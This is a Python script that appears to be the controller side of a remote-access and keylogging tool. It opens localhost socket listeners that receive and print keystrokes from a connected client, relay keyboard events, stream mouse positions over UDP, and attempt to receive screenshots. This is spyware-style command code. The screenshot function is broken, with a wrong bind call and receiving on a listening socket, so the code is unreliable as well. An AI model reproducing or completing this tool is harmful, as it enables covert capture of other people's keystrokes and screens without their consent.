import socket
from PIL import Image, ImageTk
import tkinter as tk
import io
import keyboard
import win32api
import time
import json
host = '127.0.0.1'
def start_keylogger_listener():
    port = 5000
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind((host, port))
        s.listen(1)
        print("Server listening on " + host + ":" + str(port))

        conn, addr = s.accept()
        #addr[1] is the port
        print("Connected by ",addr[0]," Port : ",addr[1])

        while True:
            data = conn.recv(1024)
            if not data:
                break
            keylogger = data.decode()
            print("Key hit : ",keylogger)


        print("Client disconnected.")
def start_keyboard_control():
    port = 5001
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((host,port))
    server_socket.listen(5)
    print(f"Listening on {host}:{port}")
    client_socket, client_addr = server_socket.accept()
    print(f"Connection established with {client_addr}")
    while True:
        key = keyboard.read_event()
        if key.event_type == keyboard.KEY_DOWN:
            key_name = key.name
            print(f"Key pressed: {key_name}")
            message = key_name
            client_socket.sendall(message.encode())
def start_mouse_control():
    port = 5002
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    server_socket.bind((host,port))
    print(f"Listening on {host}:{port}")
    data , client_addr = server_socket.recvfrom(1024)
    print(f"Connection established with {client_addr}, And the message was{data.decode()}")
    while True:
        (X,Y) = win32api.GetCursorPos()
        mouselocation = (X, Y)
        json_data = json.dumps(mouselocation).encode()
        server_socket.sendto(json_data,(client_addr))
        print("data sent to ", client_addr)
        time.sleep(1)

def receive_screenshot():
    port = 5003
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind(host,port)
    server_socket.listen(5)
    the_size_of_the_picture = int(server_socket.recv(1024).decode())
    picture_bytes = b''
    while len(picture_bytes) < the_size_of_the_picture:
            data = server_socket.recv(1024)
            if not data:
                break
            picture_bytes += data


def main():
    start_mouse_control()
    #start_keyboard_control()
    #start_keylogger_listener()
    #receive_screenshot()
if __name__ == "__main__":
     main()